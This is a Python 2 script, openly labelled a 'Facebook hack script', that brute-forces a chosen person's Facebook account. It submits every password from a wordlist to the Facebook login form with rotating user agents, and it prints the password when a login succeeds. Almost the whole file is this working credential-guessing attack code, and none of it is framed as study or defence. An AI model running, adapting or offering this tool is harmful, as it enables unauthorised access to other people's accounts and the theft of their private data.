#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To Rana Aahil
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2020


import os
import sys
import time
import random
import cookielib
import mechanize

wd = "\033[90;1m" # dark
GL = "\033[96;1m" # Blue aqua
BB = "\033[34;1m" # Blue light
YY = "\033[33;1m" # Yellow light
GG = "\033[32;1m" # Green light
WW = "\033[0;1m"  # White light
RR = "\033[31;1m" # Red light
CC = "\033[36;1m" # Cyan light
B = "\033[34m"    # Blue
Y = "\033[33;1m"    # Yellow
G = "\033[32m"    # Green
W = "\033[0;1m"     # White
R = "\033[31m"    # Red
C = "\033[36;1m"    # Cyan


def runntxt(s):
        for noobs in s + '\n':
                sys.stdout.write(noobs)
                sys.stdout.flush()
                time.sleep(10. / 2100)

def banner():
    os.system('clear')
    print " "
    runntxt(RR+"              ____________     ___  ______________")
    runntxt(RR+"              |  ___| ___ \    |  \/  |  _  |  _  |")
    runntxt(RR+"              | |_  | |_/ /_  _| .  . | | | | | | |")
    runntxt(WW+"              |  _| | ___ \ \/ / |\/| | | | | | | |")
    runntxt(WW+"              | |   | |_/ />  <| |  | \ \_/ / |/ /")
    runntxt(WW+"              \_|   \____//_/\_\_|  |_/\___/|___/")
    runntxt(WW+" ")
    runntxt(RR+"              FACEBOOK HACK SCR\033[0mIPT FROM INDONESIA")
    runntxt(RR+" ")

banner()

print " "
print RR+"ENTER TARGET ID/USERNAME "
email_target = str(raw_input(WW+"(Shelaa)==>\033[1;92m  "))
print " "
print RR+"ENTER THE WORDLIST FILE NAME"
password_list = str(raw_input(WW+"(Shelaa)==>\033[1;92m "))
login = 'https://www.facebook.com/login.php?login_attempt=1'
useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]
# useragents = [('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36','Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',)]

def pil():
                print GG+" "
                g = str(raw_input("[?] Restart?..\033[93;1m[y/n]: "))
                if g == 'y' or g == 'Y':
                    os.system('python2 FBxMOD.VNM')
                elif g == 'n' or g == 'N':
                    print wd+"exit the program..."
                    sys.exit()
                else:
                    print RR+"choose correctly..."
                    pil()

def edit_wordlist():

        print GG+" "
        ed = str(raw_input("[?] Edit wordlist .? \033[96;1m[y/n]: "))
        if ed == 'y' or ed == 'Y':
                os.system('nano '+password_list)
                pil()
        elif ed == 'n' or ed == 'N':
                print wd+"exit the program..."
                sys.exit()

        else:
                print RR+"choose correctly..."
                edit_wordlist()

def main():
        global noobs
        noobs = mechanize.Browser()
        cj = cookielib.LWPCookieJar()
        noobs.set_handle_robots(False)
        noobs.set_handle_redirect(True)
        noobs.set_cookiejar(cj)
        noobs.set_handle_equiv(True)
        noobs.set_handle_referer(True)
        noobs.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        runn_noobs()
        life()
        print " "
        print RR+" Wordlist Not Found..."
        print " "
	

def iqbalz(iqbalz_password):
  try:
 	sys.stdout.write(RR+"\n[\033[0m+\033[91m]\033[91;1m [\033[0m"+email_target+"\033[91m]\033[1;91m Mencoba \033[0m==> \033[91m[\033[90;1m"+iqbalz_password)
	sys.stdout.flush()
	noobs.addheaders = [('User-agent', random.choice(useragents))]
	site = noobs.open(login)
	noobs.select_form(nr = 0)
	noobs.form['email'] = email_target
	noobs.form['pass'] = iqbalz_password
	tom = noobs.submit()
	mask = tom.geturl()
	if mask != login and (not 'login_attempt' in mask):
                        print " "
			print ("\033[96m  S U C C E S S")
			print "          P A S S W O R D "
                  	print RR+"+-----------------------+"
	         	print (RR+"#\033[97m ID / Email Target:\033[92m {}").format(email_target)
        	        print (WW+"#\033[97m Password Target:\033[92m {}").format(iqbalz_password)
        	        print " "
        	        raw_input(GG+"[ENTER]..")
			sys.exit(1)
  
  
  except KeyboardInterrupt:
      print wd+"Stop......."
      edit_wordlist()
      sys.exit()    	    
def life():
	global iqbalz_password
	password_nob = open(password_list, "r")
	for iqbalz_password in password_nob:
		password_nob = iqbalz_password.replace("\n","")
		iqbalz(iqbalz_password)		

def runn_noobs():
         global password_list

         lop = RR+"""
              FACEBOOK HACK SCR\033[0mIPT FROM INDONESIA
   """



         print lop
         nuub = open(password_list, 'r')
         nuub = nuub.readlines()
         print RR+" [#] ID / Username Target\033[92;1m: {}".format(email_target)
         print RR+" [#] Current password number\033[92;1m:", len(nuub),'password'
         print WW+" [#] Please wait..."
         print WW+" [#] Stop Proses (CTRL+Z"
         print " "

if __name__=='__main__':
	main()	
